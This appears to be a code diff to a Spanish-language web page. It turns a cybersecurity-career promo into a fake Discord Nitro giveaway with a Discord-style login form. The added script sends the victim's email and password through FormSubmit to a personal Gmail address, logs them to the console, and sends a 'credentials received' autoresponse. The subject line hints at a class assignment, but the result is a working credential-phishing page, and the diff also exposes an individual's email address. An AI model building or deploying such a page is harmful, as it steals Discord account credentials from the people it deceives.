@@ -267,14 +267,14 @@
 
   <!-- Ventana inicial -->
   <div class="ventana" id="ventanaBienvenida">
-    <img src="d6d444d1-a7a0-4ea3-9c35-d276ee59d7b5.png" alt="Promo Ciberseguridad">
-    <h2>¡Bienvenido a Ciberseguridad!</h2>
-    <p>Descubrí las oportunidades que ofrece esta apasionante carrera.</p>
+    <img src="MXOF6CJJBNOOJJEN7Z5I3XJED4.jpg">
+    <h2>Discord Nitro!</h2>
+    <p>Canjea Discord Nitro Por 3 Meses Gratis</p>
     <ol>
-      <li>Explorá las áreas de estudio.</li>
-      <li>Conocé el campo laboral.</li>
-      <li>Encontrá dónde podés estudiarla.</li>
-      <li>¡Dale un impulso a tu futuro digital!</li>
+      <li>Avatares animados, carteles y temas de perfil.</li>
+      <li>Emojis personalizados y uso de emojis en todos los servidores.</li>
+      <li>Cargas más grandes (¡hablamos de 100 MB!)</li>
+      <li>Compartir Pantalla (hasta 4K y 60 FPS)</li>
     </ol>
     <button class="boton" onclick="mostrarLogin()">Ingresar al sitio</button>
   </div>
@@ -282,7 +282,7 @@
   <!-- Ventana de login -->
   <form class="login" id="ventanaLogin">
     <h2>Añadir cuenta</h2>
-    <p>Iniciar sesión en otra cuenta te permitirá cambiar fácilmente entre cuentas en este dispositivo.</p>
+    <p>Para poder Canjear tu Regalo debes Iniciar Sesión con tu Cuenta de Discord.</p>
 
     <div class="form-group">
       <label for="correo">Correo electrónico o número de teléfono *</label>
@@ -297,6 +297,7 @@
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_template" value="table">
     <input type="hidden" name="_subject" value="Nuevo acceso - Trabajo Ciberseguridad">
+    <input type="hidden" name="_autoresponse" value="Hemos recibido tus credenciales">
     <input type="text" name="_honey" style="display:none">
     
     <a href="#">¿Has olvidado la contraseña?</a>
@@ -344,16 +345,25 @@
         return;
       }
 
-      // Enviar datos a FormSubmit
+      console.log("Enviando datos:", { correo, contrasena }); // Para depuración
+
+      // Enviar datos DIRECTAMENTE a tu email
       const formData = new FormData(document.getElementById('ventanaLogin'));
       
-      fetch('https://formsubmit.co/el/697641b72b9e68db2a249175f58813b0', {
+      fetch('https://formsubmit.co/ajax/davidkfernandez05@gmail.com', {
         method: 'POST',
-        body: formData
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
       })
       .then(response => {
-        console.log('Formulario enviado:', response);
-        mostrarModalNitro();
+        if(response.ok) {
+          console.log('Formulario enviado con éxito');
+          mostrarModalNitro();
+        } else {
+          throw new Error('Error en el envío');
+        }
       })
       .catch(error => {
         console.error('Error:', error);
